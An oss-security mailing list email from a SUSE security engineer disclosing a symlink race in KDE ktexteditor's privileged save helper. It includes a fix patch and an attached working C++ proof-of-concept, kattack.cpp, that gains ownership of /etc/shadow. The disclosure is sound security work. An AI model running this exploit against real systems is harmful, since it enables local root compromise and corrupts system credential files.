X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["16803" "Tuesday" "24" "April" "2018" "13:11:09" "+0200" "Matthias Gerstner" "mgerstner@suse.de" "<20180424111109.oigpkbl5nqcxqmvw@f195.suse.de>" "586" "[oss-security] ktexteditor / Kate local privilege escalation" nil nil nil "4" "2018042411:11:09" "[oss-security] ktexteditor / Kate local privilege escalation" (number mark "U       mgerstner@su Apr 24  586/16803 " thread-indent "\"[oss-security] ktexteditor / Kate local privilege escalation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22190 invoked by uid 550); 24 Apr 2018 11:13:14 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 18069 invoked from network); 24 Apr 2018 11:11:22 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Date: Tue, 24 Apr 2018 13:11:09 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <20180424111109.oigpkbl5nqcxqmvw@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
	protocol="application/pgp-signature"; boundary="6pojgaqys3o3t4sd"
Content-Disposition: inline
User-Agent: NeoMutt/20170421 (1.8.2)
Subject: [oss-security] ktexteditor / Kate local privilege escalation

--6pojgaqys3o3t4sd
Content-Type: multipart/mixed; boundary="cfqsxrrpmdam22vm"
Content-Disposition: inline


--cfqsxrrpmdam22vm
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

following is a report about a local privilege escalation I found in
ktexteditor. I just informed upstream about it and will obtain a CVE
soon.

ktexteditor (https://api.kde.org/frameworks/ktexteditor/html/) provides
a text editor component for KDE applications. It is, for example, used
in the "kate" text editor program.

One of ktexteditor's features is support to write files owned by root or
other users after entering the root password via polkit authentication.
The authentication part is handled via the "kauth" framework. The actual
work of saving files on behalf of the authenticated user is performed by
a small program named "kauth_ktexteditor_helper". The related code is
found in the upstream repository in the following source files:

src/buffer/katesecuretextbuffer_p.h
src/buffer/katesecuretextbuffer.cpp

The logic for saving the file goes roughly as follows:

- the caller provides source and target file paths, a sha512 digest of
  the source file content and (optionally) the target file owner and
  group IDs.
- the helper tries to open a temporary file in the directory containing
  the target file, reads chunk from the source file and writes them to
  the target file, recalculating the sha512 digest on the way.
- in the end, if the digest matches, the temporary file will be
  rename()'d for replacing the target file path with the new file
  content.

For temporary file handling the qt5 core library facilities are employed
and the following source code lines are the important ones:

```
    // We will first generate temporary filename and then use it relatively=
 to prevent an attacker
    // to trick us to write contents to a different file by changing underl=
ying directory.
    QTemporaryFile tempFile(targetFileName);
    if (!tempFile.open()) {
        return false;
    }
    tempFile.close();
    QString tempFileName =3D QFileInfo(tempFile).fileName();
    tempFile.setFileName(tempFileName);
    if (!readFile.open(QIODevice::ReadOnly) || !tempFile.open()) {
        return false;
    }
```

This code results in the following system call sequence:

```
    openat(AT_FDCWD, "/etc", O_RDWR|O_CLOEXEC|O_TMPFILE, 0600) =3D 11
    lseek(11, 0, SEEK_SET)      =3D 0
    linkat(AT_FDCWD, "/proc/self/fd/11", AT_FDCWD, "/etc/fstab.hdRIFU",
    	AT_SYMLINK_FOLLOW) =3D 0
    close(11) =3D 0
    [...]
    openat(AT_FDCWD, "fstab.hdRIFU", O_RDWR|O_CREAT|O_CLOEXEC, 0666) =3D 12
```

So while the code author(s) have been seemingly aware that temporary
file handling needs to be done carefully they somehow still broke it in
the end which we can see from the system calls. The initially unnamed
temporary file is linked, the associated file descriptor closed and the
now named temporary file is reopened with the `O_CREAT` flag. On file
systems that don't support O_TMPFILE the vulnerability is also existing,
the code will fall back to named files right away.

As it turns out this situation can be exploited in scenarios like the
following:

A user running "kate" wants to edit and save a file in a directory that
is owned by another unprivileged user. Such directories exist for
various software e.g. in /var/lib or in /etc. The user enters root
credentials to perform the privileged save operation.

The other unprivileged user can now perform a symlink attack on the
temporary file being opened by the "kauth_ktexteditor_helper" and
achieve various effects:

- creation of new files in arbitrary file system locations.
- corruption of arbitrary existing files (because the helper will write
  the source file content into the symlinked file).
- taking ownership of arbitrary files (because the helper will perform
  an fchown() call on the symlinked file), thereby facilitating local
  root privilege escalation.

The attached proof of concept code succeeds in gaining ownership of
/etc/shadow in the described situation. Exploiting the race condition
does not work very reliably, because the window of opportunity is very
small. Some more advanced exploit code might improve the chances.

The API of the QTemporaryFile class has some non-obvious semantics. The
close() method does not really close the underlying file descriptor. The
setFileName() function, however, does. I am not clear what the original
intentions of the code above being this way might have been. As far as I
can tell the attached patch fixes the race condition detailed in this
report without breaking anything.

The vulnerable code is already found in upstream commit
f7a9573d973e6ef0cd6f2c419290c0c7e46381b7 and therefore ktexteditor
starting from version 5.34.0 can be considered vulnerable.

Cheers

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Telefon: +49 911 740 53 290
GPG Key ID: 0x14C405C971923553

SUSE Linux GmbH
GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
HRB 21284 (AG Nuernberg)

--cfqsxrrpmdam22vm
Content-Type: text/x-patch; charset=us-ascii
Content-Disposition: attachment; filename="ktexteditor_tmpfile_fix.patch"
Content-Transfer-Encoding: quoted-printable

Index: ktexteditor-5.44.0/src/buffer/katesecuretextbuffer.cpp
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
--- ktexteditor-5.44.0.orig/src/buffer/katesecuretextbuffer.cpp
+++ ktexteditor-5.44.0/src/buffer/katesecuretextbuffer.cpp
@@ -74,9 +74,7 @@ bool SecureTextBuffer::saveFileInternal(
     if (!tempFile.open()) {
         return false;
     }
-    tempFile.close();
-    QString tempFileName =3D QFileInfo(tempFile).fileName();
-    tempFile.setFileName(tempFileName);
+
     if (!readFile.open(QIODevice::ReadOnly) || !tempFile.open()) {
         return false;
     }
@@ -114,7 +112,7 @@ bool SecureTextBuffer::saveFileInternal(
     }
=20
     // rename temporary file to the target file
-    if (moveFile(tempFileName, targetFileName)) {
+    if (moveFile(tempFile.fileName(), targetFileName)) {
         // temporary file was renamed, there is nothing to remove anymore
         tempFile.setAutoRemove(false);
         return true;

--cfqsxrrpmdam22vm
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="kattack.cpp"
Content-Transfer-Encoding: quoted-printable

/**
 * Author: Matthias Gerstner (matthias.gerstner@suse.de)
 * SUSE Linux GmbH 2018
 * Date: 2018-04-23
 *
 * Local root exploit PoC for ktexteditor temporary file access race
 * condition on Linux.
 *
 * To build this run `g++ -std=3Dc++11 -O2 kattack.cpp -okattack`.
 *
 * This program tries to fool the ktexteditor service helper component into
 * writing to /etc/shadow instead of the originally intended file location =
and
 * also changing ownership of /etc/shadow to an unprivileged user, thereby
 * making a local root exploit possible.
 *
 * The weakness can also be used to write new files or change ownership of
 * arbitrary other files owned by root. It requires a special setting and
 * manual interaction though.
 *
 * To reproduce this you need the following setup:
 *
 * - a regular user account that runs the Kate text editor, we call it acco=
unt
 *   A.
 * - another "less privileged" account which can be any account for testing
 *   purposes, we call it account B.
 * - account B needs this PoC program and some arbitrary directory owned by
 *   him, containing a "config file" also owned by him. Both need to be
 *   readable by account A e.g. by being world readable. Let's assume the
 *   directory is /home/B/attackdir and the file is /home/B/attackdir/some.=
cfg.
 * - account B runs `kattack ~/attackdir`
 * - account A opens an existing /home/B/attackdir/some.cfg in Kate, changes
 *   some of the content and saves it. The ktextedit service helper compone=
nt
 *   will be triggered and asks for the root password. Enter the password.
 * - Each time account A saves the file this way there is an opportunity for
 *   the PoC to succeed. The success rate can be rather low i.e. saving a f=
ew
 *   dozen of times is needed before the PoC succeeds. The PoC program exis=
ts
 *   only when the exploit succeeded.
 *
 * The weakness exploited here is that the `kauth_ktexteditor_helper` for s=
ome
 * reason safely creates an unnamed temporary file in the target directory =
but
 * then links it using a temporary filename, closes it and reopens it with
 * (O_CREAT|O_RDWR). If an unprivileged user owns the directory where this
 * happens then this unprivileged user has the opportunity to replace the
 * original temporary file by a symlink and have the helper create or open =
the
 * target file with root permissions.
 *
 * Of some help is the fact that the helper also restores the original
 * permissions of the target file. Thus we can also have the helper change
 * ownership of root owned files to our unprivileged account B.
 *
 * Warning: If this exploit succeeds then your system's /etc/shadow file wi=
ll
 * be corrupted and end up with unsecure permissions. Keep a backup of the
 * original file (usually also found in /etc/shadow-) and restore it via `cp
 * -p /etc/shadow- /etc/shadow`.
 **/

#include <iostream>
#include <string>

#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <limits.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

class StatHelper
{
	struct stat m_s;

public:

	bool isRegular() const { return S_ISREG(m_s.st_mode) !=3D 0; }
	bool isLink() const { return S_ISLNK(m_s.st_mode) !=3D 0; }
	uid_t getOwner() const { return m_s.st_uid; }

	bool doStat(const std::string &p)
	{
		return ::stat(p.c_str(), &m_s) =3D=3D 0;
	}

	bool doLinkStat(const std::string &p)
	{
		return ::lstat(p.c_str(), &m_s) =3D=3D 0;
	}

	StatHelper()
	{
		memset(&m_s, 0, sizeof(struct stat));
	}

};

class KTextAttack
{
	bool matchesTargetFile(const std::string &evpath)
	{
		if( evpath.length() <=3D m_watchfile.length() )
		{
			// shorter or equal size: cannot be a tmpfile with suffix
			return false;
		}
		else if( evpath.substr(0, m_watchfile.length()) !=3D m_watchfile )
			// not a common prefix with out target file
			return false;

		std::string suffix(evpath.substr(m_watchfile.length()));

		if( suffix[0] !=3D '.' )
			// expecting <origfile>.[a-zA-Z].....
			return false;

		suffix =3D suffix.substr(1);

		if( suffix.length() <=3D 4 )
			// too short suffix
			return false;

		for( auto ch =3D suffix.begin(); ch !=3D suffix.end(); ch++ )
		{
			if( ! isalpha(*ch) )
				// expecting only [a-zA-Z]
				return false;
		}

		return true;
	}

	void processEvent(const struct inotify_event &ev)
	{
		std::string evpath(ev.name);

		if( (ev.mask & IN_MOVED_TO) !=3D 0 )
		{
			if( evpath =3D=3D m_watchfile )
			{
				// maybe our attack succeeded by now
				checkSuccess();
			}

			return;
		}

		if( !matchesTargetFile(evpath) )
			return;

		if( m_ignore_next_creation )
		{
			m_ignore_next_creation =3D false;
			return;
		}

		if( unlink(evpath.c_str()) !=3D 0 )
		{
			std::cerr << "Failed to unlink "
				<< evpath << ": " << strerror(errno)
				<< std::endl;
			return;
		}

		if( symlink(m_link_target.c_str(), evpath.c_str()) !=3D 0 )
		{
			std::cerr << "Failed to symlink "
				<< evpath << " -> " << m_link_target << ": "
				<< strerror(errno) << std::endl;
			return;
		}

		// to avoid an infinite loop by reaction on our own events,
		// this could be solved more cleanly probably.
		m_ignore_next_creation =3D true;

		std::cout << evpath << " created -> deleted\n";
		std::cout << "created symlink " << evpath << " -> "
			<< m_link_target << "\n";
		std::cout << std::flush;
	}

	void monitor_edits()
	{
		constexpr auto INOBUF_SIZE =3D sizeof(struct inotify_event) + NAME_MAX;
		char buf[INOBUF_SIZE];
		ssize_t bytes;

		while( (bytes =3D read(m_ino_fd, buf, INOBUF_SIZE)) !=3D -1 )
		{
			for( char *record =3D buf; record < (buf + bytes);
				record +=3D sizeof(struct inotify_event) )
			{
				const struct inotify_event &ev =3D *((struct inotify_event*)record);
				record +=3D ev.len;
				processEvent(ev);
			}
		}

		std::cerr << "Failed to read inotify events: " << strerror(errno) << std:=
:endl;
		throw 1;
	}

	void setup_inotify()
	{
		m_ino_fd =3D inotify_init1(IN_CLOEXEC);

		if( m_ino_fd =3D=3D -1 )
		{
			std::cerr << "Failed to init inotify: " << strerror(errno)
				<< std::endl;
			throw 1;
		}

		std::cout << "Waiting for change to " << m_watchfile << " in "
			<< m_watchdir << std::endl;

		m_watch_fd =3D inotify_add_watch(m_ino_fd,
			m_watchdir.c_str(), IN_CREATE | IN_MOVED_TO);

		if( m_watch_fd =3D=3D -1 )=20
		{
			std::cerr << "Failed to add watch: " << strerror(errno)
				<< std::endl;
			throw 1;
		}
	}

	void checkSuccess()
	{
		StatHelper st;

		if( !st.doLinkStat(m_watchfile) )
			return;
		else if( ! st.isLink() )
			return;

		std::string target;
		target.resize(NAME_MAX);

		ssize_t len =3D readlink(m_watchfile.c_str(), &target[0], NAME_MAX);

		if( len =3D=3D -1 )
			return;

		target.resize(len);

		try
		{
			if( target !=3D m_link_target )
				throw 2;
			else if( !st.doStat(m_link_target) )
				throw 2;
			else if( st.getOwner() !=3D ::getuid() )
				throw 2;

			std::cout << "Attack seems to have succeeded: "
				<< m_link_target << " is now owned by you"
				<< std::endl;
		}
		catch( ... )
		{
			std::cerr
				<< "Target file was replaced by symlink, "
				"but too late, the file setup is now broken"
				<< std::endl;
			recreateTargetFile();
			return;
		}

		throw 0;
	}

	void recreateTargetFile()
	{
		std::cerr << "Recreating " << m_watchfile << " with correct permissions."=
 << std::endl;
		::unlink(m_watchfile.c_str());
		int fd =3D ::open(m_watchfile.c_str(), O_RDWR | O_CREAT, 0600);

		if( fd =3D=3D -1 )
		{
			std::cerr << "Failed to recreate " << m_watchfile << ": " << strerror(er=
rno) << std::endl;
			throw 1;
		}

		close(fd);
	}

private:

	const std::string m_path;
	std::string m_watchdir;
	std::string m_watchfile;
	int m_ino_fd =3D -1;
	int m_watch_fd =3D -1;
	const std::string m_link_target;
	bool m_ignore_next_creation =3D false;

public:
	void run()
	{
		setup_inotify();
		monitor_edits();
	}

	KTextAttack(const std::string &path) :
		m_path(path),
		m_link_target("/etc/shadow")
	{
		if( m_path.find('/') !=3D m_path.npos )
		{
			m_watchdir =3D m_path;
			::dirname(&m_watchdir[0]);
			m_watchdir.resize( strlen(m_watchdir.c_str()) );
			std::cout << "watchdir =3D " << m_watchdir << "\nwatchfile =3D " << m_wa=
tchfile << std::endl;
			m_watchfile =3D m_path.substr(m_watchdir.length() + 1);
		}
		else
		{
			m_watchdir =3D ".";
			m_watchfile =3D m_path;
		}

		if( ::chdir(m_watchdir.c_str()) !=3D 0 )
		{
			std::cerr << "Failed to chdir to " << m_watchdir
				<< ": " << strerror(errno) << std::endl;
			throw 1;
		}
	}

	~KTextAttack()
	{
		if( m_watch_fd !=3D -1 )
			close(m_watch_fd);
		if( m_ino_fd !=3D -1 )
			close(m_ino_fd);
	}
};

int main(const int argc, const char **argv)
{
	if( argc !=3D 2 )
	{
		std::cerr << "Usage: "
			<< argv[0] << " [file-to-be-edited]" << std::endl;
		return 1;
	}

	std::string path(argv[1]);
	StatHelper st;

	if( !st.doLinkStat(path) )
	{
		std::cerr << path << ": " << strerror(errno) << std::endl;
		return 1;
	}
	else if( ! st.isRegular() )
	{
		std::cerr << path << ": is not a regular file" << std::endl;
		return 1;
	}

	std::cout << "Waiting for " << path << " to be edited" << std::endl;

	KTextAttack kta(path);

	try
	{
		kta.run();
	}
	catch( int res )
	{
		return res;
	}

	return 0;
}

--cfqsxrrpmdam22vm--

--6pojgaqys3o3t4sd
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBAgAGBQJa3xDNAAoJEBTEBclxkjVT9EEP/RDkTeX5DvbSDoskgQIDNK+a
4562oFZLBWVklOBTtppIfN9gjXY4iAnge+Bmty+irpCWuZeQdZywzNC+z9PrXwwC
Pg+QT99NftGdmAJLoGcIKDuqu72Dc4gIlDGO+jpqLZu+j5t1YSRuB48NgStXe8iV
vdqo1CmfR63r7m8PDtdBCipyWw+DftKoYisR3vR+XLw5Efvg81X3JvnrHCW3f+OM
23G21O8TVfhLVIxoCo6uL9iP5mHGQfXkduIlGSBfNGErAj9I+D3tzy/sD4b2zgjL
FLY9MJqfiQpPRm7kA4MmGZQIUCqlJIcqAbth6p1jBkDyA6mK0BUWMXNireOAsaf1
5QMREYrubQHYngZuyVspWb7lXgaU/BQ9ryRNh/TtbiBi0t5QWHZ28dT8QsYXr7pk
RjUfphnkstqpsLPpSL2eMyc5WG9CIZYP9XKbVIzZHM9HMrieJiIs1pl9E7+znzhP
lxO6WmoyEKPD+EE3F6h8ZVqpEnId+4pSom9C7mO2I7Uct2oVQruXhmInZwEat8h0
vLJsFZlTwk1/1Ci5BFpPdNoOp4c3mg2RrmCu2qUlr3hzNOgOI+f7k8c6iBMc1evM
drvesiOsjtNZpl/lUbygk09hd22utt1Hoj6TyFL3TmFU2Vvc7ae1g8KF1YBju4+4
FtzY31YxPoYn7mkQvO7J
=xSOP
-----END PGP SIGNATURE-----

--6pojgaqys3o3t4sd--
